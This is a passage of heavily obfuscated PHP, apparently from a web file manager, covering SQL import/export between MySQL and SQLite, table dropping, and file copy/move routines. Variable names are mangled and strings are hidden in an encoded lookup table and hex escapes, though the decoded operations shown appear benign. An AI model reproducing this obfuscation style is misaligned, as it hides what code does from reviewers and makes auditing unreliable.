(!feof($¼ßË²«‚)) { $ñÄ»Øå = trim(fgets($¼ßË²«‚)); if (!$ñÄ»Øå) { continue; } $™Ëí—öñ = $this->sqlDecode($ñÄ»Øå, $Ê¿€‡¥, $¶ª÷Ìœô); if (stripos($™Ëí—öñ, $æ²Ó°í½[408]) === 0) { if (!$üÙƒ’÷ó) { $üÙƒ’÷ó = $™Ëí—öñ . $æ²Ó°í½[53]; } continue; } if ($«ˆ²ƒÇ‘) { $«ˆ²ƒÇ‘->task[$æ²Ó°í½[806]] += 1; } $·Òß¯¶÷++; $á‘ÇÇë¹[] = rtrim(rtrim(trim($™Ëí—öñ), $æ²Ó°í½[50]), $æ²Ó°í½[71]); $ëúĞİßÒ = null; $Ëƒßì¦© = strlen($™Ëí—öñ); $¯„Š×œ += $Ëƒßì¦©; if ($¯„Š×œ >= ($•¶ÎüÀÊ == 500 ? $•Ø©‚Œê : $®†íÍ«±)) { $ëúĞİßÒ = array_pop($á‘ÇÇë¹); if ($·Òß¯¶÷ > 1) { $·Òß¯¶÷--; } } if ($·Òß¯¶÷ >= $•¶ÎüÀÊ || $ëúĞİßÒ) { $™Ëí—öñ = $üÙƒ’÷ó . implode($æ²Ó°í½[50], $á‘ÇÇë¹); if (!$Œ‹ã¬†->execute($™Ëí—öñ)) { return !1; } if ($«ˆ²ƒÇ‘) { $«ˆ²ƒÇ‘->update($·Òß¯¶÷); } $á‘ÇÇë¹ = array(); $·Òß¯¶÷ = 0; $¯„Š×œ = 0; if ($ëúĞİßÒ) { $á‘ÇÇë¹ = array($ëúĞİßÒ); $·Òß¯¶÷ = 1; $¯„Š×œ = $Ëƒßì¦©; } } } fclose($¼ßË²«‚); if (!empty($á‘ÇÇë¹)) { $™Ëí—öñ = $üÙƒ’÷ó . implode($æ²Ó°í½[50], $á‘ÇÇë¹); if (!$Œ‹ã¬†->execute($™Ëí—öñ)) { return !1; } if ($«ˆ²ƒÇ‘) { $«ˆ²ƒÇ‘->update($·Òß¯¶÷); } } return !0; } public function dropTable($ÈÑ˜ı·ø = null) { $¼øœİÇû = $this->model()->db(); $ª•€ú©¿ = $ÈÑ˜ı·ø ? array($ÈÑ˜ı·ø) : $¼øœİÇû->getTables(); if (!$ª•€ú©¿) { return; } foreach ($ª•€ú©¿ as $ÈÑ˜ı·ø) { if ($ÈÑ˜ı·ø) { $ÈÑ˜ı·ø = strtolower($ÈÑ˜ı·ø); } else { continue; } $¼øœİÇû->execute("\x64\x72\157\160\x20\x74\141\142\154\145\40\151\146\x20\145\170\x69\163\x74\x73\x20\140{$ÈÑ˜ı·ø}\140"); } } private function sqlEncode($³Ìš”®Ï) { $ãÇê®Ó  =& $_SERVER[–Ú¬çÁ]; $âÄœÖ = array(); foreach ($³Ìš”®Ï as $ÈÉÎ×é) { if (is_array($ÈÉÎ×é)) { $ÈÉÎ×é = json_encode_force($ÈÉÎ×é); } $ÈÉÎ×é = addslashes($ÈÉÎ×é); $ÈÉÎ×é = str_replace(array($ãÇê®Ó [1098], $ãÇê®Ó [206]), array($ãÇê®Ó [1099], $ãÇê®Ó [1100]), $ÈÉÎ×é); $âÄœÖ[] = str_replace($ãÇê®Ó [58], $ãÇê®Ó [1101], $ÈÉÎ×é); } return $ãÇê®Ó [58] . implode($ãÇê®Ó [1102], $âÄœÖ) . $ãÇê®Ó [58]; } private function sqlDecode($ö¬‡Èõ, $¢íª›¾µ, $Êö‰£È‘ = '') { $ş»£ì¦÷ =& $_SERVER[–Ú¬çÁ]; $ö¬‡Èõ = str_replace(array($ş»£ì¦÷[1099], $ş»£ì¦÷[1100]), array($ş»£ì¦÷[1098], $ş»£ì¦÷[206]), $ö¬‡Èõ); if ($¢íª›¾µ == $ş»£ì¦÷[13]) { return $Êö‰£È‘ != $ş»£ì¦÷[1103] ? stripslashes($ö¬‡Èõ) : $ö¬‡Èõ; } if ($Êö‰£È‘ == $ş»£ì¦÷[1103]) { $ö¬‡Èõ = str_replace($ş»£ì¦÷[1104], $ş»£ì¦÷[118], stripslashes($ö¬‡Èõ)); } return $ö¬‡Èõ; } public function getSqlFile($Ê€îşÚ = '') { $ß¶˜ÔÙ² =& $_SERVER[–Ú¬çÁ]; $ı•¼ÍËÔ = $this->dbType(!0); $ÈÀÂ¼Á = CONTROLLER_DIR . "\x69\156\163\x74\141\154\x6c\x2f\144\x61\164\x61\x2f{$ı•¼ÍËÔ}\x2e\163\161\154"; $òùÁ•«Æ = file_get_contents($ÈÀÂ¼Á); $îÊü¿Èï = $ß¶˜ÔÙ²[1105] . ($ı•¼ÍËÔ == $ß¶˜ÔÙ²[824] ? $ß¶˜ÔÙ²[1106] : $ß¶˜ÔÙ²[1107]) . $ß¶˜ÔÙ²[1108]; preg_match_all($îÊü¿Èï, $òùÁ•«Æ, $¢ëûÎº—); $ŠÌË¹ğ¯ = $¢ëûÎº—[1]; $ÇÛœºâµ = $this->model()->db(); $ïÉƒ¢¤õ = $ÇÛœºâµ->getTables(); $«øÁßô« = TEMP_FILES . $ß¶˜ÔÙ²[1109] . date($ß¶˜ÔÙ²[264]) . $ß¶˜ÔÙ²[8]; del_dir($«øÁßô«); mk_dir($«øÁßô«); $£ãğàø÷ = $«øÁßô« . $ß¶˜ÔÙ²[1110]; $ôòË—ú = $«øÁßô« . $ß¶˜ÔÙ²[1111]; $ä¬Å‡˜Ë = $ı•¼ÍËÔ == $ß¶˜ÔÙ²[13] ? $ß¶˜ÔÙ²[824] : $ß¶˜ÔÙ²[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\x74\x61\x6c\154\57\144\x61\x74\141\x2f{$ä¬Å‡˜Ë}\x2e\x73\x71\154", $«øÁßô«); @touch($«øÁßô« . $ı•¼ÍËÔ . $ß¶˜ÔÙ²[808]); $µˆâ‹ ¸ = fopen($£ãğàø÷, $ß¶˜ÔÙ²[1086]); $ èÜû«½ = fopen($ôòË—ú, $ß¶˜ÔÙ²[1086]); if ($ı•¼ÍËÔ == $ß¶˜ÔÙ²[13]) { $ïÉƒ¢¤õ = array_diff($ïÉƒ¢¤õ, array($ß¶˜ÔÙ²[804], $ß¶˜ÔÙ²[805])); $Ÿ¨¦İøÉ = array($ß¶˜ÔÙ²[1112], $ß¶˜ÔÙ²[1113], $ß¶˜ÔÙ²[1114]); fwrite($ èÜû«½, implode(PHP_EOL, $Ÿ¨¦İøÉ) . PHP_EOL . PHP_EOL); foreach ($ïÉƒ¢¤õ as $Ÿ¾Ä‡˜) { $›ÊŸø¸ğ = $this->sqlFromSqlite($Ÿ¾Ä‡˜); if (!$›ÊŸø¸ğ[$ß¶˜ÔÙ²[13]]) { continue; } fwrite($ èÜû«½, $›ÊŸø¸ğ[$ß¶˜ÔÙ²[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ÿ¾Ä‡˜, $ŠÌË¹ğ¯)) { fwrite($µˆâ‹ ¸, $›ÊŸø¸ğ[$ß¶˜ÔÙ²[824]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ïÉƒ¢¤õ as $Ÿ¾Ä‡˜) { $›ÊŸø¸ğ = $this->sqlFromMysql($Ÿ¾Ä‡˜); if (!$›ÊŸø¸ğ[$ß¶˜ÔÙ²[824]]) { continue; } fwrite($µˆâ‹ ¸, $›ÊŸø¸ğ[$ß¶˜ÔÙ²[824]] . PHP_EOL . PHP_EOL); if (!in_array($Ÿ¾Ä‡˜, $ŠÌË¹ğ¯)) { fwrite($ èÜû«½, $›ÊŸø¸ğ[$ß¶˜ÔÙ²[13]] . PHP_EOL . PHP_EOL); } } } fclose($µˆâ‹ ¸); fclose($ èÜû«½); $òùÁ•«Æ = array($ß¶˜ÔÙ²[824] => $£ãğàø÷, $ß¶˜ÔÙ²[13] => $ôòË—ú); return $Ê€îşÚ ? $òùÁ•«Æ[$Ê€îşÚ] : $òùÁ•«Æ; } public function dbType($ŒÆòğ‡» = false) { $…â®ğ» =& $_SERVER[–Ú¬çÁ]; $âÄ±ëÀê = $ŒÆòğ‡» ? $GLOBALS[$…â®ğ»[6]][$…â®ğ»[21]] : $this->database; $âÄ±ëÀê = array_change_key_case($âÄ±ëÀê); $—·§¼¼š = $âÄ±ëÀê[$…â®ğ»[987]]; if ($—·§¼¼š == $…â®ğ»[984]) { $ÁÏ³È¸ = explode($…â®ğ»[4], $âÄ±ëÀê[$…â®ğ»[993]]); $—·§¼¼š = $ÁÏ³È¸[0]; } $ªİ¥›Ÿ÷ = array($…â®ğ»[1115] => $…â®ğ»[13], $…â®ğ»[932] => $…â®ğ»[824]); if (isset($ªİ¥›Ÿ÷[$—·§¼¼š])) { $—·§¼¼š = $ªİ¥›Ÿ÷[$—·§¼¼š]; } return $—·§¼¼š; } public function sqlFromMysql($‡½ôĞ®, $¼Ùæğ° = '') { $ûšõ®©ö =& $_SERVER[–Ú¬çÁ]; $ĞûÀ—¶ = $this->model()->db(); $ú¼ÛòãÕ = $ĞûÀ—¶->query($ûšõ®©ö[1116] . $‡½ôĞ® . $ûšõ®©ö[438]); if (!$ú¼ÛòãÕ || !$ú¼ÛòãÕ[0]) { return !1; } $˜–à®µ† = _get($ú¼ÛòãÕ[0], $ûšõ®©ö[1117], $ûšõ®©ö[12]); if (!$˜–à®µ†) { return !1; } $„Òš³ïÊ = "\x44\x52\x4f\x50\40\x54\x41\x42\x4c\x45\40\x49\106\x20\105\x58\x49\123\x54\x53\x20\140{$‡½ôĞ®}\140\x3b" . PHP_EOL . $˜–à®µ† . $ûšõ®©ö[71]; if ($¼Ùæğ° && $¼Ùæğ° == $ûšõ®©ö[824]) { return $„Òš³ïÊ; } $âñâ‘’À = array_change_key_case($GLOBALS[$ûšõ®©ö[6]][$ûšõ®©ö[21]]); $´³Õêæ¼ = $âñâ‘’À[$ûšõ®©ö[992]]; $‰Õ›Ş½ = $ûšõ®©ö[1118] . $´³Õêæ¼ . $ûšõ®©ö[1119] . $‡½ôĞ® . $ûšõ®©ö[58]; $²â¦Ë©° = $ûšõ®©ö[1120] . $‡½ôĞ® . $ûšõ®©ö[920]; $ïÊáã†¥ = $ĞûÀ—¶->query($‰Õ›Ş½); if (empty($ïÊáã†¥)) { $«¶ù›î­ = array($ûšõ®©ö[824] => $ûšõ®©ö[12], $ûšõ®©ö[13] => $ûšõ®©ö[12]); return $¼Ùæğ° ? $«¶ù›î­[$¼Ùæğ°] : $«¶ù›î­; } $áğæá¿ø = $ĞûÀ—¶->query($²â¦Ë©°); $’×’¾ı« = $ûšõ®©ö[12]; $«Ã†í›ã = array(); foreach ($áğæá¿ø as $¢ù‹÷Ã) { if (!$’×’¾ı« && $¢ù‹÷Ã[$ûšõ®©ö[1121]] == $ûšõ®©ö[1122]) { $’×’¾ı« = $¢ù‹÷Ã[$ûšõ®©ö[1123]]; } if (isset($«Ã†í›ã[$¢ù‹÷Ã[$ûšõ®©ö[1121]]])) { $«Ã†í›ã[$¢ù‹÷Ã[$ûšõ®©ö[1121]]][$ûšõ®©ö[1124]][] = $¢ù‹÷Ã[$ûšõ®©ö[1123]]; continue; } $«Ã†í›ã[$¢ù‹÷Ã[$ûšõ®©ö[1121]]] = array($ûšõ®©ö[1125] => $¢ù‹÷Ã[$ûšõ®©ö[1121]], $ûšõ®©ö[1124] => array($¢ù‹÷Ã[$ûšõ®©ö[1123]]), $ûšõ®©ö[1126] => $¢ù‹÷Ã[$ûšõ®©ö[1127]] == $ûšõ®©ö[88] ? 0 : 1); } $É¾¹õô  = array(); foreach ($«Ã†í›ã as $¢ù‹÷Ã) { $”ïñÆèİ = $¢ù‹÷Ã[$ûšõ®©ö[1125]] == $ûšõ®©ö[1122]; $˜ä¦µ‹ô = array($ûšõ®©ö[1128], $¢ù‹÷Ã[$ûšõ®©ö[1126]] == $ûšõ®©ö[88] && !$”ïñÆèİ ? $ûšõ®©ö[1129] : $ûšõ®©ö[12], $ûšõ®©ö[1130], $ûšõ®©ö[1131] . $‡½ôĞ® . $ûšõ®©ö[11] . ($”ïñÆèİ ? $ûšõ®©ö[1132] : $¢ù‹÷Ã[$ûšõ®©ö[1125]]) . $ûšõ®©ö[118], $ûšõ®©ö[1133], $ûšõ®©ö[118] . $‡½ôĞ® . $ûšõ®©ö[118], $ûšõ®©ö[1134] . implode($ûšõ®©ö[1135], $¢ù‹÷Ã[$ûšõ®©ö[1124]]) . $ûšõ®©ö[1136]); $É¾¹õô [] = implode($ûšõ®©ö[53], $˜ä¦µ‹ô) . $ûšõ®©ö[71]; } $Î±Ë«õ = array(); $¹­–‹º¸ = array($ûšõ®©ö[1137] => $ûšõ®©ö[1138], $ûšõ®©ö[1138] => $ûšõ®©ö[1138], $ûšõ®©ö[341] => $ûšõ®©ö[368], $ûšõ®©ö[340] => $ûšõ®©ö[368]); foreach ($ïÊáã†¥ as $¢ù‹÷Ã) { $˜ä¦µ‹ô = array($ûšõ®©ö[118] . $¢ù‹÷Ã[$ûšõ®©ö[1139]] . $ûšõ®©ö[118], isset($¹­–‹º¸[$¢ù‹÷Ã[$ûšõ®©ö[1140]]]) ? $¹­–‹º¸[$¢ù‹÷Ã[$ûšõ®©ö[1140]]] : $¢ù‹÷Ã[$ûšõ®©ö[1141]], $¢ù‹÷Ã[$ûšõ®©ö[1142]] == $ûšõ®©ö[918] ? $ûšõ®©ö[1143] : $ûšõ®©ö[1144], $¢ù‹÷Ã[$ûšõ®©ö[1139]] == $’×’¾ı« ? $ûšõ®©ö[1145] : $ûšõ®©ö[12], $¢ù‹÷Ã[$ûšõ®©ö[969]] ? strtoupper(str_replace($ûšõ®©ö[11], $ûšõ®©ö[12], $¢ù‹÷Ã[$ûšõ®©ö[969]])) : $ûšõ®©ö[12]); $Î±Ë«õ[] = trim(implode($ûšõ®©ö[53], $˜ä¦µ‹ô)); } $¥°–Œ¾ = array($ûšõ®©ö[1146] . $‡½ôĞ® . $ûšõ®©ö[1147], $ûšõ®©ö[1148] . $‡½ôĞ® . $ûšõ®©ö[1149], implode($ûšõ®©ö[50] . PHP_EOL, $Î±Ë«õ), $ûšõ®©ö[966]); $ø†€ì­› = implode(PHP_EOL, array_merge($¥°–Œ¾, $É¾¹õô )); if ($¼Ùæğ° && $¼Ùæğ° == $ûšõ®©ö[13]) { return $ø†€ì­›; } $«¶ù›î­ = array($ûšõ®©ö[824] => $„Òš³ïÊ, $ûšõ®©ö[13] => $ø†€ì­›); return $¼Ùæğ° ? $«¶ù›î­[$¼Ùæğ°] : $«¶ù›î­; } public function sqlFromSqlite($ìüÀü¿, $›•ú¡Éô = '') { $Ì¸–» =& $_SERVER[–Ú¬çÁ]; $‚êÊÛ‡„ = $this->model()->db(); $Ìí„ìÑç = "\x50\122\x41\107\x4d\101\40\124\101\102\114\x45\x5f\x49\116\x46\x4f\x20\50\47{$ìüÀü¿}\47\x29"; $¬ÓĞè’İ = "\123\x45\x4c\105\x43\x54\40\x2a\x20\x46\x52\x4f\115\x20\x73\161\x6c\151\164\x65\137\155\141\163\164\x65\x72\40\x57\x48\105\x52\x45\40\x74\x62\x6c\137\x6e\x61\155\x65\x20\75\x20\47{$ìüÀü¿}\47"; $¬¹à…©› = $‚êÊÛ‡„->query($Ìí„ìÑç); if (empty($¬¹à…©›)) { $ã¤¶á…† = array($Ì¸–»[824] => $Ì¸–»[12], $Ì¸–»[13] => $Ì¸–»[12]); return $›•ú¡Éô ? $ã¤¶á…†[$›•ú¡Éô] : $ã¤¶á…†; } $Êƒ´€äá = $‚êÊÛ‡„->query($¬ÓĞè’İ); $¼Ïø‡ù = $ê‡à©›Ã = array(); foreach ($Êƒ´€äá as $¸ñö«¥³) { if ($¸ñö«¥³[$Ì¸–»[33]] == $Ì¸–»[332]) { $¼Ïø‡ù[] = $¸ñö«¥³[$Ì¸–»[1150]]; } else { $ê‡à©›Ã[$¸ñö«¥³[$Ì¸–»[32]]] = $¸ñö«¥³[$Ì¸–»[1150]]; } } $Ùëœ¯ƒ¯ = array_merge(array($Ì¸–»[1146] . $ìüÀü¿ . $Ì¸–»[118]), $¼Ïø‡ù, array_values($ê‡à©›Ã)); $Ùëœ¯ƒ¯ = implode($Ì¸–»[71] . PHP_EOL, $Ùëœ¯ƒ¯) . $Ì¸–»[71]; if ($›•ú¡Éô && $›•ú¡Éô == $Ì¸–»[13]) { return $Ùëœ¯ƒ¯; } $ÒáŒŞ‰ = array(); $‡ûä¤âà = array($Ì¸–»[1138] => $Ì¸–»[1151], $Ì¸–»[368] => $Ì¸–»[1152]); $ÖûÚÇ— = $Ì¸–»[12]; foreach ($¬¹à…©› as $¸ñö«¥³) { if ($¸ñö«¥³[$Ì¸–»[57]] == $Ì¸–»[88]) { $ÖûÚÇ— = $¸ñö«¥³[$Ì¸–»[32]]; } $å•Ï¥¹ = array($Ì¸–»[438] . $¸ñö«¥³[$Ì¸–»[32]] . $Ì¸–»[438], isset($‡ûä¤âà[$¸ñö«¥³[$Ì¸–»[33]]]) ? $‡ûä¤âà[$¸ñö«¥³[$Ì¸–»[33]]] : $¸ñö«¥³[$Ì¸–»[33]], $¸ñö«¥³[$Ì¸–»[35]] == $Ì¸–»[88] ? $Ì¸–»[1143] : $Ì¸–»[1153] . $¸ñö«¥³[$Ì¸–»[56]], $¸ñö«¥³[$Ì¸–»[57]] == $Ì¸–»[88] ? $Ì¸–»[1154] : $Ì¸–»[12]); $ÒáŒŞ‰[] = trim(implode($Ì¸–»[53], $å•Ï¥¹)); } foreach ($ê‡à©›Ã as $¢™Ø†„ => $ºµôÍÖ¢) { $¿ƒéµ÷¨ = str_replace($Ì¸–»[1155] . $ìüÀü¿ . $Ì¸–»[11], $Ì¸–»[12], $¢™Ø†„); $„†ÕÛĞú = str_replace(array($Ì¸–»[118], $Ì¸–»[977]), $Ì¸–»[438], substr($ºµôÍÖ¢, stripos($ºµôÍÖ¢, $Ì¸–»[313]))); if ($¿ƒéµ÷¨ == $Ì¸–»[1132]) { $°ÜÛàÜô = $Ì¸–»[1156] . $ÖûÚÇ— . $Ì¸–»[1157]; } else { $°ÜÛàÜô = (stripos($¿ƒéµ÷¨, $Ì¸–»[11]) ? $Ì¸–»[1158] : $Ì¸–»[12]) . ($Ì¸–»[1159] . $¿ƒéµ÷¨ . $Ì¸–»[1160] . $„†ÕÛĞú); } $ÒáŒŞ‰[] = $°ÜÛàÜô; } $®Ü£—ÔŸ = array($Ì¸–»[1161] . $ìüÀü¿ . $Ì¸–»[1162], $Ì¸–»[1163] . $ìüÀü¿ . $Ì¸–»[1164], implode($Ì¸–»[50] . PHP_EOL, $ÒáŒŞ‰), $Ì¸–»[1165]); $¹Ñê÷Ä– = implode(PHP_EOL, $®Ü£—ÔŸ); if ($›•ú¡Éô && $›•ú¡Éô == $Ì¸–»[824]) { return $¹Ñê÷Ä–; } $ã¤¶á…† = array($Ì¸–»[824] => $¹Ñê÷Ä–, $Ì¸–»[13] => $Ùëœ¯ƒ¯); return $›•ú¡Éô ? $ã¤¶á…†[$›•ú¡Éô] : $ã¤¶á…†; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($˜ëšßŠ, $ìÆî) { $íû®«ä =& $_SERVER[–Ú¬çÁ]; $ìÔßÅò÷ = $ìÆî; $GLOBALS[$íû®«ä[1166]] = $íû®«ä[1167] . $˜ëšßŠ; Hook::trigger($íû®«ä[1167] . $˜ëšßŠ . $íû®«ä[1168], $ìÔßÅò÷); $Ş»©Ø½ = self::driverMake($ìÆî[0]); if (!$Ş»©Ø½) { return !1; } if (method_exists($Ş»©Ø½, $˜ëšßŠ)) { $™…¹ö±´ = @call_user_func_array(array($Ş»©Ø½, $˜ëšßŠ), $ìÆî); } else { if (method_exists($Ş»©Ø½, $íû®«ä[1169])) { $™…¹ö±´ = @call_user_func_array(array($Ş»©Ø½, $˜ëšßŠ), $ìÆî); } else { if (method_exists(self, $˜ëšßŠ)) { $™…¹ö±´ = @call_user_func_array(array(self, $˜ëšßŠ), $ìÆî); } else { $™…¹ö±´ = call_user_func_array(array(parent, $˜ëšßŠ), $ìÆî); } } } Hook::trigger($íû®«ä[1167] . $˜ëšßŠ . $íû®«ä[1170], $ìÔßÅò÷, $™…¹ö±´); return $™…¹ö±´; } public static function init($”©œ €Ú) { return self::driverMake($”©œ €Ú); } public static function copy($ŸõŠôì©, $æèŠ’ßº, $ñ½Û»´¡ = false, $¬´¹Áë¨ = false) { return self::copyMoveStart($ŸõŠôì©, $æèŠ’ßº, $ñ½Û»´¡, $_SERVER[–Ú¬çÁ][596], $¬´¹Áë¨); } public static function move($¦Ùëà”, $öİ¬èôè, $ûµ–ş‡û = false, $‚¡¨…Ø° = false) { return self::copyMoveStart($¦Ùëà”, $öİ¬èôè, $ûµ–ş‡û, $_SERVER[–Ú¬çÁ][598], $‚¡¨…Ø°); } private static function copyMoveStart($²±ˆŠäã, $é½İòµ, $ğÚÈ©Î©, $¥±¯µü, $ÒÆã¸†´) { $ú¹ˆô =& $_SERVER[–Ú¬çÁ]; $«‡ëŞ¸ = array($²±ˆŠäã, $é½İòµ, $ğÚÈ©Î©, $ÒÆã¸†´); Hook::trigger($ú¹ˆô[1167] . $¥±¯µü . $ú¹ˆô[1168], $«‡ëŞ¸); $ŞÙ¦³Â = self::copyMove($²±ˆŠäã, $é½İòµ, $ğÚÈ©Î©, $¥±¯µü, $ÒÆã¸†´); Hook::trigger($ú¹ˆô[1167] . $¥±¯µü . $ú¹ˆô[1170], $«‡ëŞ¸, $ŞÙ¦³Â); return $ŞÙ¦³Â; } public static function saveFile($¥æÜ«, $ÁÙßÜÜ, $ŒËö¶ä = true) { $ùì¥†ì =& $_SERVER[–Ú¬çÁ]; $İòùÖü  = self::info($ÁÙßÜÜ); $Ë˜Îƒ‰Å = self::driverMake($¥æÜ«); $Ü¸Ë—‚Ë = self::driverMake($ÁÙßÜÜ); $üÖéÂÆú = !1; if ($Ü¸Ë—‚Ë->pathParse[$ùì¥†ì[1171]]) { $üÖéÂÆú = $Ü¸Ë—‚Ë; $í¤™‘¨Î = $Ü¸Ë—‚Ë->pathParse[$ùì¥†ì[1171]]; $Ü¸Ë—‚Ë = self::driverMake($í¤™‘¨Î); } if ($Ë˜Îƒ‰Å->pathParse[$ùì¥†ì[1171]]) { $ëµÍ«íŒ = $Ë˜Îƒ‰Å->pathParse[$ùì¥†ì[1171]]; $Ë˜Îƒ‰Å = self::driverMake($ëµÍ«íŒ); } $°–‘½¬È = $Ü¸Ë—‚Ë->pathFather($ÁÙßÜÜ); $¥ÆÂİ» = !0; if (!$ŒËö¶ä && self::driverIsSame($Ë˜Îƒ‰Å, $Ü¸Ë—‚Ë)) { $¥ÆÂİ» = !1; } $Ü„—ï«ù = self::copyFile($Ë˜Îƒ‰Å, $¥æÜ«, $Ü¸Ë—‚Ë, $°–‘½¬È, $İòùÖü [$ùì¥†ì[32]], $¥ÆÂİ»); if ($üÖéÂÆú) { $Ü„—ï«ù = $üÖéÂÆú->getPathOuter($Ü„—ï«ù); } return $Ü„—ï«ù; } private static function copyMove($×öåÍ•È, $Ğ—…ÃÉª, $’×¼£¯Ô, $ùÌŠíŠ, $ã‘ç®È = false) { $ñ•û‚Ğˆ =& $_SERVER[–Ú¬çÁ]; if (!$×öåÍ•È || $×öåÍ•È == $ñ•û‚Ğˆ[8] || !$Ğ—…ÃÉª) { return !1; } ignore_timeout(); $Õ¥­‡ÑÂ = self::driverMake($×öåÍ•È); $¼—²°Ëö = self::driverMake($Ğ—…ÃÉª); $åÄÒøº = $ùÌŠíŠ == $ñ•û‚Ğˆ[598]; $ÄÓß¿ù = !1; if ($¼—²°Ëö->pathParse[$ñ•û‚Ğˆ[1171]]) { $ÄÓß¿ù = $¼—²°Ëö; $Ğ—…ÃÉª = $¼—²°Ëö->pathParse[$ñ•û‚Ğˆ[1171]]; $¼—²°Ëö = self::driverMake($Ğ—…ÃÉª); } if ($Õ¥­‡ÑÂ->pathParse[$ñ•û‚Ğˆ[1171]]) { $×öåÍ•È = $Õ¥­‡ÑÂ->pathParse[$ñ•û‚Ğˆ[1171]]; $Õ¥­‡ÑÂ = self::driverMake($×öåÍ•È); } self::check($Õ¥­‡ÑÂ, $×öåÍ•È, $¼—²°Ëö, $Ğ—…ÃÉª); Hook::trigger($ñ•û‚Ğˆ[1172], $Õ¥­‡ÑÂ, $×öåÍ•È, $¼—²°Ëö, $Ğ—…ÃÉª); $šâ­Ï “ = self::driverIsSame($Õ¥­‡ÑÂ, $¼—²°Ëö); if ($šâ­Ï “) { if ($ùÌŠíŠ == $ñ•û‚Ğˆ[598] && !method_exists($¼—²°Ëö, $ñ•û‚Ğˆ[1173]) && trim($Ğ—…ÃÉª, $ñ•û‚Ğˆ[8]) == trim($¼—²°Ëö->pathFather($×öåÍ•È), $ñ•û‚Ğˆ[8])) { if ($Õ¥­‡ÑÂ->pathThis($×öåÍ•È) != $ã‘ç®È && !$Õ¥­‡ÑÂ->isTypeObject()) { return $Õ¥­‡ÑÂ->rename($×öåÍ•È, $ã‘ç®È); } return $¼—²°Ëö->getPathOuter($×öåÍ•È); } if (method_exists($¼—²°Ëö, $ùÌŠíŠ)) { return $¼—²°Ëö->{$ùÌŠíŠ}($×öåÍ•È, $Ğ—…ÃÉª, $’×¼£¯Ô, $ã‘ç®È); } } if ($šâ­Ï “ && $ùÌŠíŠ == $ñ•û‚Ğˆ[598] && $¼—²°Ëö->getType() == $ñ•û‚Ğˆ[106]) { $•ù‹ºàñ = $¼—²°Ëö->movePath($×öåÍ•È, $Ğ—…ÃÉª, $ã‘ç®È); if ($•ù‹ºàñ) { return $•ù‹ºàñ; } } $Û¿á²éê = $Õ¥­‡ÑÂ->isFile($×öåÍ•È); if (!$Û¿á²éê && $¼—²°Ëö->getType() == $ñ•û‚Ğˆ[777] && $Õ¥­‡ÑÂ->getType() == $ñ•û‚Ğˆ[106]) { $•ù‹ºàñ = $¼—²°Ëö->copyFolderFromIO($Õ¥­‡ÑÂ, $×öåÍ•È, $Ğ—…ÃÉª, $’×¼£¯Ô, $åÄÒøº, $ã‘ç®È); } else { $•ù‹ºàñ = self::copyPath($Õ¥­‡ÑÂ, $×öåÍ•È, $¼—²°Ëö, $Ğ—…ÃÉª, $’×¼£¯Ô, $åÄÒøº, $Û¿á²éê, $ã‘ç®È); } if ($•ù‹ºàñ && $åÄÒøº) { $Õ¥­‡ÑÂ->remove($×öåÍ•È); } if ($ÄÓß¿ù) { $•ù‹ºàñ = $ÄÓß¿ù->getPathOuter($•ù‹ºàñ); } return $•ù‹ºàñ; } private static function check($¦Ú™ªşŞ, $°×›äÁá, $ìµ•ş˜, &$²àêàÆ°) { $ÂëÌ =& $_SERVER[–Ú¬çÁ]; if (self::driverIsSame($¦Ú™ªşŞ, $ìµ•ş˜) && $¦Ú™ªşŞ->isFolder($°×›äÁá) && $¦Ú™ªşŞ->isParentOf($°×›äÁá, $²àêàÆ°)) { show_json(LNG($ÂëÌ[1174]), !1); } if (!$¦Ú™ªşŞ->exist($°×›äÁá)) { show_json(LNG($ÂëÌ[105]), !1); } } private static function copyPath($é×¨Š™€, $¸ü€Ş˜š, $ùè–‘Û¡, $÷¼Ïş‡µ, $ç†ÊœÖ, $ŞâÅõ½ñ, $‰¾™Öâİ, $¸ƒ¼å = false, $èÄÃŒ„£ = true) { $À‹£­™Ó =& $_SERVER[–Ú¬çÁ]; $ş ‡¼©Ú = empty($¸ƒ¼å) && $¸ƒ¼å !== $À‹£­™Ó[222] ? $é×¨Š™€->pathThis($¸ü€Ş˜š) : $¸ƒ¼å; if ($ç†ÊœÖ) { $œÓú´ı = $ùè–‘Û¡->fileNameExist($÷¼Ïş‡µ, $ş ‡¼©Ú); $”ªãöÁ³ = $ş ‡¼©Ú; $ş ‡¼©Ú = $ùè–‘Û¡->fileNameAuto($÷¼Ïş‡µ, $ş ‡¼©Ú, $ç†ÊœÖ, !$‰¾™Öâİ); if (!$œÓú´ı || $”ªãöÁ³ != $ş ‡¼©Ú) { $ç†ÊœÖ = !1; } if ($èÄÃŒ„£ && !$ç†ÊœÖ) { $ùè–‘Û¡->_data[$À‹£­™Ó[1175]] = !0; } } if ($‰¾™Öâİ) { return self::copyFile($é×¨Š™€, $¸ü€Ş˜š, $ùè–‘Û¡, $÷¼Ïş‡µ, $ş ‡¼©Ú, $ŞâÅõ½ñ); } if ($ç†ÊœÖ == REPEAT_RENAME_FOLDER) { $ç†ÊœÖ = !1; } $áÒş«ªØ = rtrim($÷¼Ïş‡µ, $À‹£­™Ó[8]) . $À‹£­™Ó[8] . $ş ‡¼©Ú; $ŸŠÓø‰ = $ùè–‘Û¡->mkdir($ùè–‘Û¡->getPath($áÒş«ªØ), $ç†ÊœÖ); $÷¼Ïş‡µ = $ùè–‘Û¡->getPathInner($ŸŠÓø‰); $ÛÇ¸ÊÂñ = $é×¨Š™€->listPath($¸ü€Ş˜š, !0); $ÛÇ¸ÊÂñ = is_array($ÛÇ¸ÊÂñ) ? $ÛÇ¸ÊÂñ : array($À‹£­™Ó[83] => array(), $À‹£­™Ó[82] => array()); $Èúîİ® = array_merge($ÛÇ¸ÊÂñ[$À‹£­™Ó[83]], $ÛÇ¸ÊÂñ[$À‹£­™Ó[82]]); foreach ($Èúîİ® as $—ß‰¾À‚) { $í×¾ƒªå = $—ß‰¾À‚[$À‹£­™Ó[33]] == $À‹£­™Ó[224]; $¸ü€Ş˜š = $é×¨Š™€->getPathInner($—ß‰¾À‚[$À‹£­™Ó[84]]); $Âùğ·£½ = self::copyPath($é×¨Š™€, $¸ü€Ş˜š, $ùè–‘Û¡, $÷¼Ïş‡µ, $ç†ÊœÖ, $ŞâÅõ½ñ, $í×¾ƒªå, !1, !1); if (!$Âùğ·£½) { IO::errorTips($À‹£­™Ó[1176] . $¸ü€Ş˜š . 